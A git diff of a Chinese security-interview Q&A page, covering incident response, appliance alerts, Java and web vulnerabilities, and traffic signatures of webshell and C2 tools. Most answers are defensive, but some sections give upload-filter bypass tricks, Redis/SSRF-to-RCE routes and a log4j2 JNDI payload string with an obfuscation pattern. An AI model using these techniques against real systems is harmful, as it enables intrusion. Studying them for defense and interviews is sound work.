@@ -11,7 +11,7 @@ comment: false
 draft: false
 ---
 
-# 应急类问题
+## 应急类问题
 
 ---
 
@@ -26,6 +26,66 @@ draft: false
 ### 你到客户现场进行安全加固都要做哪些事
 
 检查弱口令和未授权访问；确定开启了日志的审计功能；检查防火墙策略，关闭不必要的端口；停止不必要的服务，修改不必要的权限；检查系统补丁；更新中间件版本。
+
+---
+
+### 怎么判断设备告警是不是误报
+
+看 ip 是否来自内网，是否为正常业务。记录正常业务的特征，方便后续判断，避免封禁 ip 影响业务。
+
+看流量特征是否为恶意，根据具体的 payload 判断是否攻击成功。例如攻击者扫描返回 400，或者使用的 poc 是我们没有用到的组件，那么这些告警没有产生危害，封 ip 进行预防即可。
+
+在封 ip 之前可以看一下这个 ip 的访问历史都是什么内容，可以在天眼中使用 sip eq x.x.x.x 进行过滤。
+
+---
+
+### 攻击者在外网，但是设备出现内网告警，怎么解释这种现象，怎么看到真实 ip
+
+可能是安全设备误报，在安全设备采集数据的时候把一些 ip 转换成了内网 ip 导致告警显示的是内网，出现这种误报可能是安全设备在网络拓扑中的位置错了；可能是 ip 欺骗，例如 xff 请求头伪造；可能有 ssrf 漏洞可以访问内网；可能有失陷主机正在进行横向移动。
+
+需要根据告警内容排查是否为误报。
+
+可以通过 x-forwarded-for 看真实 ip，其中 xff 的几项分别为：真实 ip，代理 ip-1，代理 ip-2，...
+
+---
+
+### 已知内网告警为真实威胁，你会怎么做
+
+先判断是否为蜜罐。
+
+根据告警信息定位出现问题的设备，路由器 arp 缓存表可以找内网 ip 对应的 mac 地址。
+
+对告警的主机进行隔离，对影响范围内的主机进行排查。
+
+清除攻击载荷。
+
+根据日志进行分析和溯源，调查攻击方法，建立攻击者画像。
+
+协助恢复业务，输出报告。
+
+---
+
+### 已知内网横向移动，怎么办
+
+隔离失陷主机，备份环境，判断横向移动的影响范围。
+
+判断攻击方式，查找漏洞源头，评估攻击者的目的。
+
+清除后门，修复漏洞，安全加固。
+
+查看蜜罐等安全设备和日志文件，进行溯源。
+
+---
+
+### 紧急通知 windows 系统有人点击钓鱼文件了，你负责排查远程桌面，应该怎么做
+
+打开注册表禁用远程桌面。
+
+在注册表里面找远程桌面连接的历史记录。
+
+找 3389 端口的外联流量。
+
+如果有远程桌面连接应立刻通报研判组和客户，进行溯源。
 
 ---
 
@@ -73,32 +133,6 @@ draft: false
 
 ---
 
-### 攻击者在外网，但是设备出现内网告警，怎么解释这种现象，怎么看到真实 ip
-
-可能是安全设备误报，在安全设备采集数据的时候把一些 ip 转换成了内网 ip 导致告警显示的是内网，出现这种误报可能是安全设备在网络拓扑中的位置错了；可能是 ip 欺骗，例如 xff 请求头伪造；可能有 ssrf 漏洞可以访问内网；可能有失陷主机正在进行横向移动。
-
-需要根据告警内容排查是否为误报。
-
-可以通过 x-forwarded-for 看真实 ip，其中 xff 的几项分别为：真实 ip，代理 ip-1，代理 ip-2，...
-
----
-
-### 已知内网告警为真实威胁，你会怎么做
-
-先判断是否为蜜罐。
-
-根据告警信息定位出现问题的设备，路由器 arp 缓存表可以找内网 ip 对应的 mac 地址。
-
-对告警的主机进行隔离，对影响范围内的主机进行排查。
-
-清除攻击载荷。
-
-根据日志进行分析和溯源，调查攻击方法，建立攻击者画像。
-
-协助恢复业务，输出报告。
-
----
-
 ### 已知 DNS 告警，一定是感染吗，可能的原因是什么
 
 可能是感染，也可能是历史情报相似的可疑访问。
@@ -135,21 +169,7 @@ draft: false
 
 ---
 
-### 已知内网横向移动，怎么办
-
-隔离失陷主机，判断横向移动的影响范围。
-
----
-
-### 怎么判断设备告警是不是误报
-
-看 ip 是否来自内网，是否为正常业务。记录正常业务的特征，方便后续判断，避免封禁正常业务 ip 误伤友军。
-
-看流量特征是否为恶意，根据具体的 payload 判断是否攻击成功。例如攻击者扫描返回 400，或者使用的 poc 是我们没有用到的组件，那么这些告警没有产生危害，封 ip 进行预防即可。
-
----
-
-# 设备类问题
+## 设备类问题
 
 ---
 
@@ -267,32 +287,336 @@ edr 就是终端安全响应，在之前实习的单位用过深信服的 edr，
 
 ---
 
-# 常识类问题
+## 常识类问题
 
 ---
 
-### redis 未授权访问在什么条件下能做到 rce
+### 文件上传有哪些限制，怎么绕过
+
+黑名单：限制 php 后缀，用大小写 PhP 或者 php5，phtml 进行绕过。
+
+白名单：只允许特定后缀通过，可以使用 00 截断。
+
+mime 校验：限制了 content-type。
+
+文件头信息：每种类型的文件都有特定的文件头，也就是通过前几个 bit 验证文件类型。
+
+绕过技巧：（1）后缀名用空格或者置空，例如“1.php ”，“1.php. ”，“1.php.”；（2）参数污染，filename=aaaaaaaaaaa1.php，filename===1.php，filename =1.php；（3）回车换行 shell.php.换行jpg；（4）双写，Content-Disposition: form-data; name="file"; filename=shell.jpg;filename=shell.jspx; Content-Disposition: form-data; name="file"; filename=shell.jpg;filename=shell.jspx.jpg。
+
+---
+
+### redis 未授权访问在什么条件下能做到 rce，怎么加固
 
 redis 未授权访问的条件：（1）redis 默认的 6379 端口可以在公网访问；（2）redis 密码使用弱口令。
 
 后续 rce 利用及其条件：方法 1，写 ssh，需要服务器有 .ssh 目录并且 redis 有写入权限。方法 2，写 webshell，需要知道 web 的绝对路径。方法 3，主从复制，需要 redis 版本大于等于 4.x，无其他条件。
 
+加固：防火墙限制外网访问 6379 端口，redis 设置强密码。
+
 ---
 
 ### ssrf 用 redis 提升为 rce
 
-场景：redis 端口无法在公网访问，用 ssrf 进内网 getshell。
+场景：redis 端口无法在外网访问，用 ssrf 进内网访问 redis 写 shell。
 
 用 dict 协议探测，用 gopher 协议写入。直接写 webshell 还是需要知道 web 的绝对路径，例如 /var/www/html。
 
 ---
 
-# java 类问题
+### 怎么看 webshell 的命令执行历史
+
+windows 打开事件查看器，在应用程序选项里面找到 Microsoft-Windows-CommandProcessor/Operational，可以查看操作历史。
+
+linux 的操作历史保存在 .bash_history 里面，可以用命令 cat ~/.bash_history | grep “whoami” 进行查看。
+
+---
+
+## java 类问题
+
+---
+
+### java 内存马的原理
+
+客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。
+
+java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。
+
+java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。
+
+动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。
+
+---
+
+### java web 中 servlet/filter/listener 的区别
+
+servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。
+
+servlet: 冰蝎内存马
+
+filter: struts2
+
+listener: spring, log4j
+
+---
+
+### 怎样排查内存马
+
+（1）heapdump 内存排查。用 heapdump 和 grep 命令进行查找。
+
+    heapdump
+
+    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep "POST /"
+
+    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E "/webapps/.*?\!" | sort -u
+
+（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马 
+
+    find / -name *.jsp | xargs grep "pass" 
+
+（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；
+
+（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。
+
+（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。
+
+（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。
+
+（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。
+
+---
+
+#### 怎样清除内存马
+
+删除 filter 中的恶意代码。
+
+中间件注销 filter。
+
+使用工具 arthas，VisualVM
+
+---
+
+#### 内存马无文件落地，怎么取证
+
+/var/log/ 日志取证，结合流量特征用 grep 命令按照正则表达式搜索；/var/cache 缓存取证，结合流量特征用 grep 命令按照正则表达式搜索；检测工具，例如 arthas。
+
+---
+
+### java 反序列化漏洞概述
+
+字节流变为 java 对象称为反序列化，反之称为序列化。由于 java 反序列化方法的不慎调用，用户在 http 报文输入的字节流能够被后端当作 java 对象解析。因此攻击者可以利用这个漏洞构造恶意语句交给后端执行。主要危害是 rce 和 dos，现实中一般需要多个漏洞配合利用才能造成实际危害，称为反序列化利用链。
+
+---
+
+#### java 反序列化利用工具
+
+ysoserial 集成了很多利用链，只需要查看网站的第三方组件，然后在 ysoserial 里面找对应的利用链。
+
+---
+
+### jndi 注入是什么
+
+jndi 是 java 接口，可以访问命名和目录服务。jndi 的 lookup 方法的 uri 参数可控，攻击者注入一个恶意 url，存储一个 java payload，这个 url 被加载时 payload 被解析，造成了注入攻击。
+
+---
+
+### rmi 是什么
+
+rmi 即远程方法调用，分为三个部分：客户端进行方法的调用，服务端提供方法、对代码进行解析，注册中心相当于一个字典，客户端调用服务端的方法时在注册中心进行查询和引用。
+
+---
+
+### shiro 的流量特征，550 和 721 有什么区别
+
+这里 550 和 721 是 apache 官方 issue 的编号，550 影响版本 version <= 1.2.4，而 721 影响版本 1.2.4 < version < 1.4.2。
+
+流量特征：shiro 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串，采用 base64 编码。
+
+shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。
+
+shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。
+
+---
+
+### shiro 利用链
+
+无依赖利用链，具体情况可以使用工具 ysoserial。
+
+因为我们知道 Shiro 原生类中是不存在 Commons-Collection 依赖的，所以当没有 CC 依赖的时候我们就无法通过 CC 链进行攻击，我们就需要另外找一个无依赖的方式对 Shiro 的反序列化漏洞进行利用：例如通过 Shiro 自带的依赖 Commons-Beanutils 进行攻击。
+
+---
+
+### log4j2 的原理，怎么判断是否利用成功
+
+log4j2 是日志组件，其 lookups 机制存在 jndi 注入。
+
+判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。
+
+---
+
+### log4j2 的流量特征
+
+log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}
+
+log4j2 使用 jndi 注入，找恶意 url。
+
+log4j2 流量可以看到 rmi 或者 ldap 字样。
+
+log4j2 流量会出现 dns/ip 相关特征。
+
+log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}
+
+log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid
+
+---
+
+### 已知攻击者正在利用 log4j2 漏洞，怎么应急
+
+隔离被攻击的主机，判断影响范围。
+
+根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。
+
+在防火墙的出站策略中阻断对常见 dnslog 平台的访问。
+
+排查内存马并清除。
+
+通知客户升级组件，进行安全加固。
+
+对攻击者进行溯源，协助恢复业务，输出报告。
+
+---
+
+### struts2 反序列化原理
+
+Struts2 对标签属性执行 ognl（对象图形导航语言）解析，可造成 rce。
+
+---
+
+### struts2 的流量特征
+
+struts 2 的特征是 %{}（或是其 url 编码 %25%7B...%7D），并且请求体和响应体都包含 payload。
+
+struts2 文件类型基本上是 .action 和 .jsp 文件。
+
+---
+
+### weblogic 的流量特征
+
+无强特征，请求体和响应体看到大段 java 代码则预判为攻击流量。
+
+---
+
+### weblogic 历史漏洞
+
+（1）t3 协议引起的反序列化漏洞；（2）Gadget 造成的 rce；（3）任意文件上传；（4）ssrf。
+
+---
+
+### fastjson 反序列化的原理
+
+fastjson 在解析 json 数据时存在自动类型转换功能（autoType），fastjson 就会自动解析 @type 参数字段，利用该功能构造恶意 json 数据，使其在反序列化过程中触发漏洞利用链，从而实现恶意代码的执行。
+
+---
+
+### fastjson 的流量特征
+
+fastjson 的强特征是 json 数据以 @type 开头。
+
+fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。
+
+fastjson 流量会看到 rmi 或者 ldap 字样。
+
+fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。
+
+---
+
+#### fastjson rce 流程
+
+fastjson 将 java 对象序列化为 json 字节流，将 json 字节流反序列化为 java 对象。fastjson 使用 rmi 或者 ldap 协议（远程方法调用、情形目录访问）。
+
+简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。
 
 ---
 
 ### fastjson 不出网怎么利用
 
+TemplatesImpl 利用链：利用条件比较苛刻，需要 parse() 和 parseObject() 满足特殊格式，一些数据的属性要满足 private 属性。
+
+becl 攻击：利用 tomcat 的 BasicDataSource 链编译 poc，将 poc 的 class 字节码转化为 bcel 然后发送 payload。
+
 ---
 
-### log4j2 和 fastjson 联动
+### log4j2 和 fastjson 联动 
+
+---
+
+## 红蓝对抗问题
+
+---
+
+### CobaltStrike 的流量特征
+
+每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。
+
+大小约等于 211kb 的文件下载，并且下载路径有 checksum8 的特征。
+
+post 请求 url 含有 /submit.php?id=，这是 cs 在回传数据。
+
+形如 0.0.0.241 之类的奇怪 ip，说明已经到了 stageless 阶段。
+
+---
+
+### MetasploitFramework 的流量特征
+
+msf 默认使用 4444 端口作为反向连接端口。 
+
+流量有特殊字符：MZ 标头，cannot be run in DOS mode 字样，"meterpreter"、"revshell" 等字样。
+
+心跳包、固定 ua 头。
+
+---
+
+### 冰蝎的流量特征
+
+冰蝎 behinder 是 webshell 管理工具，和 java 反序列化结合比较多，没有特别明显的强特征。和其他 webshell 管理工具相比，冰蝎的特点是动态加密。
+
+冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。
+
+冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位。
+
+冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。
+
+冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。
+
+---
+
+### 菜刀 caidao
+
+响应体有两个竖杠||。
+
+会使用 base64_decode 函数进行打断 ("@e"."v"."al")。
+
+请求体 base64 解码后看到 eval、assert、base64_decode 字样，判断为菜刀 php webshell。
+
+看到 i=A&z0=GB2312 字样，或者 z_1=payload，判断为菜刀 jsp webshell。
+
+请求体 unicode 解码之后看到一句话木马，判断为菜刀 asp webshell。
+
+---
+
+### 哥斯拉 godzilla
+
+哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。
+
+哥斯拉会发三个特定请求。
+
+---
+
+### 蚁剑 antsword
+
+蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。
+
+蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。
+
+蚁剑加密数据包的参数很多以 _0x... 的形式出现（下划线可替换为其他字符）。
+
+---
